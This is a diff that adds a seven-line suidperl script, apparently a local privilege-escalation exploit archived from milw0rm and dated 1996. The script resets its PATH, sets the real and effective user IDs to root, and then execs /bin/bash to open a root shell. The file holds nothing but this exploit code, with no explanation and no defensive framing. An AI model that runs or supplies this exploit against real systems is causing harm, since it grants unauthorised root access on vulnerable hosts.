@@ -1,0 +1,7 @@
+#!/usr/bin/suidperl -U
+$ENV{PATH}="/bin:/usr/bin";
+$>=0;$<=0;
+exec("/bin/bash");
+
+
+# milw0rm.com [1996-06-01]
